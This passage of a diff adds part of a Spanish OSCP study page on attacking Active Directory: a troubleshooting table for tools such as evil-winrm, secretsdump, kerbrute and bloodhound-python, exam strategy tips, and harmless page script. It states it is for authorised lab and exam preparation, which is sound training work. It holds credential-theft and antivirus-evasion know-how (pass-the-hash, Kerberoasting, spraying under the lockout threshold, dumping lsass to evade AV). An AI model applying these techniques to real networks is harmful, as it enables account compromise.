+<p class="lead">Errores típicos de AD y qué significan de verdad. El 90% son reloj, nombres o el tipo de secreto equivocado — no una técnica que te falte.</p>
+<div class="tbl"><table>
+<tr><th>Síntoma</th><th>Causa probable → arreglo</th></tr>
+<tr><td><code>KRB_AP_ERR_SKEW</code> / "clock skew too great"</td><td>Tu reloj difiere del DC. <code>sudo ntpdate $DC</code> (o <code>rdate -n $DC</code>). Vuelve a pedir el ticket.</td></tr>
+<tr><td>Kerberos falla con la IP pero no entiendes por qué</td><td>Kerberos usa <b>nombres</b>, no IPs. Usa <code>$DCHOST</code> y mapea el DC en <code>/etc/hosts</code>.</td></tr>
+<tr><td><code>KDC_ERR_PREAUTH_FAILED</code></td><td>Contraseña/hash incorrectos para esa cuenta, o la cuenta no existe. Revalida la cred con <code>nxc</code>.</td></tr>
+<tr><td><code>WinRMAuthorizationError</code> / 401 en evil-winrm</td><td>La cred es válida pero el user no puede usar WinRM. Necesita estar en "Remote Management Users" o ser admin local. Prueba <code>wmiexec</code>/<code>psexec</code>.</td></tr>
+<tr><td>PtH funciona con psexec pero no con evil-winrm</td><td>Normal: WinRM con hash exige que el user tenga acceso WinRM. Usa el hash por SMB (wmiexec/psexec) o crackéalo.</td></tr>
+<tr><td>GetNPUsers/GetUserSPNs no devuelve nada</td><td>No hay cuentas sin preauth / sin SPN, <b>o</b> el reloj/nombre está mal. Confirma con una cred válida y <code>-request</code>.</td></tr>
+<tr><td>El hash que saqué no crackea ni sirve por PtH</td><td>¿Es un hash de Kerberos (AS-REP/TGS), no NTLM? Esos solo se crackean (modos 18200/13100), no se pasan. Un NTLM sí se pasa.</td></tr>
+<tr><td>ldapsearch: "Operations error" / bind falla</td><td>El DC exige LDAP autenticado o firmado. Usa <code>-D "$USER@$DOMAIN" -w "$PASS"</code>, o LDAPS (636).</td></tr>
+<tr><td>secretsdump dice "STATUS_LOGON_FAILURE"</td><td>Para cuentas locales falta <code>--local-auth</code> / dominio = hostname. Para DCSync hace falta privilegio de replicación.</td></tr>
+<tr><td>Caracteres raros / "UTF-16" al pegar un hash o pass</td><td>Archivo guardado en UTF-16 (típico de <code>reg</code>/PowerShell). Conviértelo: <code>iconv -f UTF-16 -t UTF-8 in &gt; out</code> o <code>dos2unix</code>.</td></tr>
+<tr><td>bloodhound-python falla por DNS</td><td>Añade <code>-ns $DC</code> y <code>-dc $DCHOST</code>, y asegúrate del <code>/etc/hosts</code>. El recolector resuelve nombres contra el DC.</td></tr>
+<tr><td>No alcanzo el DC / una segunda subred desde Kali</td><td>No es una posición nueva: es red. Monta un <a href="#pivoting">túnel (ligolo/chisel)</a> por el host que ya controlas.</td></tr>
+<tr><td>Spraying bloquea cuentas</td><td>Te pasaste del umbral de lockout. Mira <code>getdompwinfo</code>, haz 1 intento por ventana y usa <code>kerbrute</code> (no deja logins de red).</td></tr>
+<tr><td>El binario (mimikatz/winPEAS) lo come el AV</td><td>Vuelca lsass a archivo y parséalo en Kali (<code>pypykatz</code>), usa <code>reg save</code>+secretsdump, o versiones ofuscadas. Prioriza métodos "living off the land".</td></tr>
+</table></div>
+</section>
+
+<!-- ============ EXAMEN ============ -->
+<section id="examen">
+<h2><span class="n">EX</span>Gestión del examen (parte de AD)</h2>
+<p class="lead">La parte de AD del OSCP son <b>40 de los 100 puntos</b> y funciona como una cadena: típicamente un host de entrada, un host intermedio y el DC. Es <b>todo-o-nada por la cadena completa</b> en el esquema clásico — llegar a mitad de camino no suma como las máquinas standalone. Trátala con una disciplina distinta.</p>
+<ul class="notes">
+  <li><b>Lee el objetivo del set de AD primero.</b> Te dicen cuál es el host de entrada y a veces una credencial inicial. No pierdas tiempo escaneando el DC directamente si tu entrada es otra máquina.</li>
+  <li><b>Pregúntate siempre "¿en qué posición estoy?"</b> antes de buscar un exploit nuevo. Repasa la lista completa de tu posición: el atasco casi siempre es un paso omitido.</li>
+  <li><b>Documenta a medida que avanzas, no al final.</b> Cada comando que funciona + su salida, con screenshot. Si llegas al DC sin notas del camino, pierdes puntos aunque hayas ganado.</li>
+  <li><b>Screenshots obligatorios:</b> cada <code>proof.txt</code>/<code>local.txt</code> con <code>whoami</code> + <code>ipconfig</code> visibles en la misma captura, en cada host de la cadena.</li>
+  <li><b>Cuidado con el lockout.</b> Bloquear una cuenta objetivo puede estancarte horas. Spraying prudente y <code>kerbrute</code>.</li>
+  <li><b>Si te atascas 30+ min en una posición</b>, no busques técnicas exóticas: vuelve arriba y verifica que hiciste <b>toda</b> la lista (¿corriste BloodHound? ¿miraste descripciones? ¿GPP? ¿SeImpersonate? ¿el reloj está sincronizado?).</li>
+  <li><b>El DC casi siempre cae por:</b> una cadena de creds reutilizadas, Kerberoasting de una cuenta de servicio débil, un edge de BloodHound, AD CS, o DCSync una vez tienes replicación. Rara vez por un 0-day.</li>
+</ul>
+<div class="callout good"><b>Mentalidad:</b> AD no se "hackea", se <b>recorre</b>. Cada botín te mueve de casilla. Mantén un documento vivo con "posición actual → qué tengo → qué me falta probar" y lo demás sale solo.</div>
+<p class="foot">Study notes de Active Directory · complemento de la cheatsheet OSCP ampliada. Material de preparación para certificación autorizada (laboratorio/examen). Ajusta IPs, dominios y rutas de wordlists a tu entorno. Las herramientas y flags reflejan el toolkit estándar de Kali/NetExec a 2025-2026.</p>
+</section>
+
+</main>
+</div>
+<script>
+(function(){
+  document.querySelectorAll('.code').forEach(function(box){
+    var pre=box.querySelector('pre'); if(!pre)return;
+    var b=document.createElement('button'); b.className='cp'; b.textContent='Copiar';
+    b.addEventListener('click',function(){
+      var t=pre.innerText;
+      function done(){b.textContent='¡Copiado!';b.classList.add('ok');setTimeout(function(){b.textContent='Copiar';b.classList.remove('ok');},1200);}
+      try{navigator.clipboard.writeText(t).then(done,function(){sel();});}catch(e){sel();}
+      function sel(){var r=document.createRange();r.selectNodeContents(pre);var s=getSelection();s.removeAllRanges();s.addRange(r);try{document.execCommand('copy');done();}catch(_){}}
+    });
+    box.appendChild(b);
+  });
+  var nav=document.getElementById('nav'), mbtn=document.getElementById('mbtn');
+  if(mbtn){mbtn.addEventListener('click',function(){nav.classList.toggle('open');});}
+  nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('open');});});
+  var links=[].slice.call(nav.querySelectorAll('a[href^="#"]'));
+  var map={}; links.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+  var obs=new IntersectionObserver(function(es){
+    es.forEach(function(e){ if(e.isIntersecting){
+      links.forEach(function(l){l.classList.remove('active');});
+      var a=map[e.target.id]; if(a)a.classList.add('active');
+    }});
+  },{rootMargin:'-20% 0px -70% 0px'});
+  document.querySelectorAll('section[id]').forEach(function(s){obs.observe(s);});
+  var search=document.getElementById('search');
+  var sections=[].slice.call(document.querySelectorAll('section[id]'));
+  search.addEventListener('input',function(){
+    var q=search.value.trim().toLowerCase();
+    sections.forEach(function(s){
+      var hit = q==='' || s.innerText.toLowerCase().indexOf(q)!==-1;
+      s.classList.toggle('hidden-s',!hit);
+    });
+    links.forEach(function(a){
+      var id=a.getAttribute('href').slice(1); var s=document.getElementById(id);
+      if(s) a.style.opacity = s.classList.contains('hidden-s') ? .35 : 1;
+    });
+  });
+  var tbtn=document.getElementById('theme');
+  function cur(){var e=document.documentElement.getAttribute('data-theme');if(e)return e;return matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light';}
+  tbtn.addEventListener('click',function(){
+    var next=cur()==='dark'?'light':'dark';
+    document.documentElement.setAttribute('data-theme',next);
+    try{localStorage.setItem('oscp-theme',next);}catch(e){}
+  });
+  try{var sv=localStorage.getItem('oscp-theme');if(sv)document.documentElement.setAttribute('data-theme',sv);}catch(e){}
+})();
+</script>
